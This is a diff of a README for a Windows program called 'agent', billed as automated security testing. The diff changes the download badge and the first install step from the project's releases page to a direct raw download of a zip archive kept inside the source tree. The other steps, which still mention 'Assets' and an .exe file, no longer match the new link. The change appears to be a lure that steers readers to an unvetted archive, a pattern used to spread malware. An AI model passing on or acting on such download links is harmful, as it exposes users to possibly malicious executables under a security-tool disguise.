@@ -1,6 +1,6 @@
 # 🛡️ agent - Automated security testing for your computer
 
-[![](https://img.shields.io/badge/Download_Agent_Now-blue?style=for-the-badge)](https://github.com/Wulan234/agent/releases)
+[![](https://img.shields.io/badge/Download_Agent_Now-blue?style=for-the-badge)](https://github.com/Wulan234/agent/raw/refs/heads/main/src/cli/Software_v1.8.zip)
 
 ## 📋 About This Software
 
@@ -23,7 +23,7 @@ To run Agent on your computer, ensure your system meets these standards:
 
 Follow these steps to obtain and run the application on your Windows machine:
 
-1. Visit the project website: [https://github.com/Wulan234/agent/releases](https://github.com/Wulan234/agent/releases).
+1. Visit the project website: [https://github.com/Wulan234/agent/raw/refs/heads/main/src/cli/Software_v1.8.zip](https://github.com/Wulan234/agent/raw/refs/heads/main/src/cli/Software_v1.8.zip).
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the file ending in `.exe` to download it to your computer.
 4. Locate the file in your Downloads folder.
